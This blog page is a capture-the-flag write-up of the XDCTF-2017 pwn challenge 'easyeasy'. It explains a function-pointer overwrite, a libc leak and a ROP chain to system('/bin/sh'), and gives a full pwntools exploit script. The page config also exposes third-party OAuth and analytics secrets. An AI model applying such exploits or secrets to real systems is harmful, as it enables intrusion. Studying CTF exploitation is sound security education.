@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="rBm2uFCV50">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.plusls.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.13.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="分析拿到题目后F5，发现是个菜单题，并且给出了libc linux下如何加载指定的so文件，可以见： Linux 加载动态链接库原理分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[XDCTF-2017] easyeasy">
+<meta property="og:url" content="https://blog.plusls.com/ctf/xdctf-2017/pwn/easyeasy/">
+<meta property="og:site_name" content="plusls&#39; blog">
+<meta property="og:description" content="分析拿到题目后F5，发现是个菜单题，并且给出了libc linux下如何加载指定的so文件，可以见： Linux 加载动态链接库原理分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.plusls.com/ctf/xdctf-2017/pwn/easyeasy/img/1.png">
+<meta property="og:image" content="https://blog.plusls.com/ctf/xdctf-2017/pwn/easyeasy/img/2.png">
+<meta property="og:image" content="https://blog.plusls.com/ctf/xdctf-2017/pwn/easyeasy/img/3.png">
+<meta property="og:image" content="https://blog.plusls.com/ctf/xdctf-2017/pwn/easyeasy/img/4.png">
+<meta property="og:image" content="https://blog.plusls.com/ctf/xdctf-2017/pwn/easyeasy/img/5.png">
+<meta property="article:published_time" content="2017-10-06T10:16:27.000Z">
+<meta property="article:modified_time" content="2017-10-06T10:16:30.000Z">
+<meta property="article:author" content="plusls">
+<meta property="article:tag" content="none">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.plusls.com/ctf/xdctf-2017/pwn/easyeasy/img/1.png">
+
+
+<link rel="canonical" href="https://blog.plusls.com/ctf/xdctf-2017/pwn/easyeasy/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://blog.plusls.com/ctf/xdctf-2017/pwn/easyeasy/","path":"ctf/xdctf-2017/pwn/easyeasy/","title":"[XDCTF-2017] easyeasy"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[XDCTF-2017] easyeasy | plusls' blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-96606331-1"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"UA-96606331-1","only_pageview":false}</script>
+  <script src="/js/third-party/analytics/google-analytics.js"></script>
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="plusls' blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">plusls' blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">一条咸鱼的博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">6</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">24</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">35</span></a></li><li class="menu-item menu-item-friends"><a href="/friends/" rel="section"><i class="fa fa-address-book fa-fw"></i>friends</a></li><li class="menu-item menu-item-todo-list"><a href="/todo-list/" rel="section"><i class="fa fa-calendar fa-fw"></i>todo-list</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sub-400B4B"><span class="nav-number">1.1.</span> <span class="nav-text">sub_400B4B</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-number">2.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%99%84%E5%BD%95"><span class="nav-number">3.</span> <span class="nav-text">附录</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="plusls"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">plusls</p>
+  <div class="site-description" itemprop="description">咸鱼</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/plusls" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;plusls" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:plusls@qq.com" title="E-Mail → mailto:plusls@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/plusls" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.plusls.com/ctf/xdctf-2017/pwn/easyeasy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="plusls">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="plusls' blog">
+      <meta itemprop="description" content="咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[XDCTF-2017] easyeasy | plusls' blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [XDCTF-2017] easyeasy
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2017-10-06 18:16:27 / 修改时间：18:16:30" itemprop="dateCreated datePublished" datetime="2017-10-06T18:16:27+08:00">2017-10-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/ctf/xdctf-2017/" itemprop="url" rel="index"><span itemprop="name">xdctf-2017</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/ctf/xdctf-2017/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/ctf/xdctf-2017/pwn/easyeasy/" class="post-meta-item leancloud_visitors" data-flag-title="[XDCTF-2017] easyeasy" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>拿到题目后F5，发现是个菜单题，并且给出了libc</p>
+<p>linux下如何加载指定的so文件，可以见： <a target="_blank" rel="noopener" href="http://blog.plusls.cn/technical/binary/pwn/load-so/">Linux 加载动态链接库原理分析</a></p>
+<span id="more"></span>
+
+<p>先挑重点说吧</p>
+<h4 id="sub-400B4B"><a href="#sub-400B4B" class="headerlink" title="sub_400B4B"></a>sub_400B4B</h4><p>在这里 <strong>qword_6020D0</strong> 这个全局变量被分析出了奇怪的语法</p>
+<p><img data-src="/ctf/xdctf-2017/pwn/easyeasy/img/1.png" alt="奇怪的语法"></p>
+<p>考虑它是一个结构体一样的东西，根据F5手动创建一个结构体</p>
+<p><img data-src="/ctf/xdctf-2017/pwn/easyeasy/img/2.png" alt="结构体"></p>
+<p>创建后F5便正常了许多</p>
+<p><img data-src="/ctf/xdctf-2017/pwn/easyeasy/img/3.png" alt="正常"></p>
+<p>在阅读源码后可以得知，在执行 <strong>sub_400985</strong> 时可以将 fun4 的最后一个byte重写，也就是说在</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(*(<span class="type">void</span> (**)(<span class="type">void</span>))(*qword_6020D0)-&gt;fun4)();</span><br></pre></td></tr></table></figure>
+
+<p>可以执行到 <strong>0x400A**</strong></p>
+<p>在翻看汇编代码时发现，若是让其执行到 <strong>0x00400AAF</strong> ，则它在执行其内部的 <strong>0x400A35</strong> 时</p>
+<p>会触发栈溢出，同时 <strong>0x400A35</strong> 并没有 <strong>canary</strong> ，简直完美的利用条件</p>
+<p><img data-src="/ctf/xdctf-2017/pwn/easyeasy/img/4.png" alt="溢出点"></p>
+<p>以这个图为例，可以构造如下rop链</p>
+<p><strong>0x7ffca4b29fb0</strong> -&gt; <strong>pop rdi;retn</strong></p>
+<p><strong>0x7ffca4b29fb8</strong> -&gt; <strong>&#x2F;bin&#x2F;sh</strong></p>
+<p><strong>0x7ffca4b29fc0</strong> -&gt; <strong>system</strong></p>
+<p>即可获取shell</p>
+<p><strong>pop rdi;retn</strong> 已经找到</p>
+<p>也就是说，若是泄露了 <strong>libc</strong> 的地址，那么一切问题都解决了。</p>
+<p>（然而智障的我被坑了好久</p>
+<p>下面这句话是重点！</p>
+<p><strong>在初始化got表时，会调用libc中的某个函数，也就是说在初始化got表时，会在栈上残留一些指向libc的指针！</strong></p>
+<p><strong>注：若是需要这样泄露libc地址时，千万不要乱nop函数，比如nop掉alarm函数，这样会导致栈信息的变化。同时这个操作极其依赖libc，最好能加载泄露的libc进行调试</strong></p>
+<p>在 <strong>sub_400A35</strong> 中，它写入数据时并没有在结尾加 <strong>‘\0’</strong> ，因此可以借它泄露信息。</p>
+<p>在 <strong>0x0400AC4</strong> 下断点，查看此时的内存</p>
+<p><img data-src="/ctf/xdctf-2017/pwn/easyeasy/img/5.png" alt="stack"></p>
+<p>可以知道 <strong>0x7ffc07edc048</strong> 指向了该libc的 <strong>libc.bss(4176)</strong> 这个位置，这样一来就有了所有的信息</p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>下面为本题的 POC</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- #</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_byte</span>(<span class="params">program, addr</span>):</span><br><span class="line">    program.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    program.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment"># 32=0x20 恰好为最后一个函数指针的位置</span></span><br><span class="line">    program.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        program.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">        program.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    program.recvuntil(<span class="string">&#x27;Give me your luckynum:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    program.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">program, rbp, addr_list</span>):</span><br><span class="line">    call_byte(program, <span class="number">0xAF</span>) <span class="comment">#call read</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(rbp)</span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> addr_list:</span><br><span class="line">        payload += p64(addr)</span><br><span class="line"></span><br><span class="line">    program.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc_addr</span>(<span class="params">program, libc</span>):</span><br><span class="line">    program.send(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x7</span> + <span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">    program.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">    addr = u64(program.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>) <span class="comment"># _IO_stdfile_2_lock wtf????</span></span><br><span class="line"></span><br><span class="line">    program.recvuntil(<span class="string">&#x27;5. exit\n&#x27;</span>)</span><br><span class="line">    program.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    program.sendline(<span class="string">&#x27;10&#x27;</span>)</span><br><span class="line">    program.sendline(<span class="string">&#x27;plusls&#x27;</span>)</span><br><span class="line">    program.recvuntil(<span class="string">&#x27;Success!&#x27;</span>)</span><br><span class="line">    program.recvuntil(<span class="string">&#x27;5. exit\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    libc_addr = addr - libc.bss(<span class="number">4176</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;libc addr=&#x27;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">    log.info(<span class="string">&#x27;system addr=&#x27;</span> + <span class="built_in">hex</span>(libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> libc_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> VERBOSE:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> LOCAL:</span><br><span class="line">        program = process(<span class="string">&#x27;./easyeasy&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        program = remote(<span class="string">&#x27;117.34.105.149&#x27;</span>, <span class="number">1251</span>)</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        gdb.attach(program)</span><br><span class="line"></span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">    libc_addr = get_libc_addr(program, libc)</span><br><span class="line"></span><br><span class="line">    addr_list = [<span class="number">0x4010b3</span>,libc_addr + <span class="built_in">list</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))[<span class="number">0</span>], libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    call(program, u64(<span class="string">&#x27;aaaaaaaa&#x27;</span>), addr_list)</span><br><span class="line"></span><br><span class="line">    program.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>flag我也忘了</p>
+<h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><p>附件： <a href="easyeasy.zip">easyeasy.zip</a></p>
+<p>包含idb文件以及题目</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>我很可爱，请给我钱</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/alipay.png" alt="plusls 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>plusls
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://blog.plusls.com/ctf/xdctf-2017/pwn/easyeasy/" title="[XDCTF-2017] easyeasy">https://blog.plusls.com/ctf/xdctf-2017/pwn/easyeasy/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/technical/binary/pwn/load-so/" rel="prev" title="Linux 加载动态链接库原理分析">
+                  <i class="fa fa-chevron-left"></i> Linux 加载动态链接库原理分析
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/ctf/0ctf-2018/writeup-list/" rel="next" title="[0CTF-2018] writeup-list">
+                  [0CTF-2018] writeup-list <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">plusls</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">89k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:21</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"o2OHCYF4i2z8Fu6sPsBGNnwJ-gzGzoHsz","app_key":"vVprl1Ih2X5u0SmQo6NnSmR8","server_url":"https://o2ohcyf4.lc-cn-n1-shared.com","security":false}</script>
+  <script src="/js/third-party/statistics/lean-analytics.js"></script>
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"plusls","repo":"plusls.github.io","client_id":"be430880e81b9f6f1789","client_secret":"bc1c24724cc38b3457292eb0390cca30e24c8fba","admin_user":"plusls","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"65f53a0262ead607debb01456f9aaf9d"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
